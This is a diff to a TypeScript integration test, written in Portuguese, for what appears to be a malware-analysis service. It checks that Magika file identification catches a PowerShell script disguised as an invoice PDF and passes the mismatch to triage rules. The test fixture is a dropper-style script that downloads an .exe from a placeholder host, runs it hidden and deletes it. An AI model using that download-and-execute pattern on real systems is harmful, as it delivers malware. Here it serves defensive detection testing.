@@ -13,6 +13,7 @@ import { unpackChildCreator } from '../../src/lib/entry-create';
 import { prisma } from '../../src/lib/prisma';
 import { ensureBucket } from '../../src/lib/s3';
 import { analyzeBuffer } from '../../src/lib/static-analysis';
+import { loadFacts } from '../../src/lib/triage-rules';
 import {
   enqueueIdentify,
   identifiable,
@@ -113,9 +114,13 @@ async function main() {
       identifies,
     ),
   );
+  const text = Buffer.from('Write-Host "um script qualquer, sem extensão"');
   ok(
-    'texto e acima do teto não',
-    !identifiable(analyzeBuffer(Buffer.from('nada'), 'a.txt') as never, 4) &&
+    'texto sem tipo vai só para o Magika (de 16 bytes a 10 MB); PDF, quase vazio e acima do teto não',
+    identifiable(analyzeBuffer(text, 'a') as never, text.length) &&
+      !identifiable(analyzeBuffer(Buffer.from('nada'), 'a.txt') as never, 4) &&
+      !identifiable({ detectedType: null }, 10 * 1024 * 1024 + 1) &&
+      !identifiable(analyzeBuffer(Buffer.from('%PDF-1.4\n%%EOF'), 'a.pdf') as never, 14) &&
       !identifiable({ detectedType: { id: 'pe' } }, env.UNPACK_MAX_MB * 1024 * 1024 + 1),
   );
 
@@ -228,6 +233,47 @@ async function main() {
       goPivot?.value === 'github.com/mandiant/GoReSym' &&
       goPivot.source === 'unpack',
     { go: goJob && { ...goJob, functions: goJob.functions.slice(0, 5) }, goPivot },
+  );
+
+  // Magika (item 22): texto sem tipo vai so para a identificacao; o PowerShell disfarcado de PDF
+  // diverge da extensao e a analise de scripts roda como PowerShell.
+  const psPdf = await upload(
+    bob,
+    'fatura.pdf',
+    Buffer.from(
+      'Invoke-WebRequest -Uri "http://exemplo.invalid/a.exe" -OutFile "$env:TEMP\\a.exe"\n' +
+        'Start-Process -FilePath "$env:TEMP\\a.exe" -WindowStyle Hidden\n' +
+        'Remove-Item -Path "$env:TEMP\\a.exe" -Force\n' +
+        'Get-ChildItem -Path "$env:APPDATA" | Out-Null\n',
+    ),
+  );
+  await unpackIdle();
+  const magikaJob = await job(psPdf);
+  const magika = magikaJob?.magika as any;
+  const psPdfEntry = await prisma.entry.findUnique({
+    where: { id: psPdf },
+    select: { staticInfo: true },
+  });
+  const script = (psPdfEntry?.staticInfo as any)?.script;
+  ok(
+    'Magika: PowerShell disfarçado de PDF, divergência da extensão e scripts pela linguagem dele',
+    magikaJob?.status === 'DONE' &&
+      magikaJob.note === 'só identificado: não é executável' &&
+      magika?.label === 'powershell' &&
+      magika.score >= 0.9 &&
+      magika.mismatch?.basis === 'extension' &&
+      magika.mismatch.expected[0] === 'pdf' &&
+      script?.language === 'powershell' &&
+      (psPdfEntry?.staticInfo as any)?.scriptBy === 'magika' &&
+      (await children(psPdf)).length === 0,
+    { magikaJob, script: script && { language: script.language, risk: script.risk } },
+  );
+  // Regra de triagem pela divergencia do Magika (condicao MAGIKA sem valor).
+  const facts = await loadFacts(psPdf);
+  ok(
+    'Magika: a divergência chega à triagem',
+    facts?.facts.magika?.mismatch === true,
+    facts?.facts.magika,
   );
 
   const before = restarts();
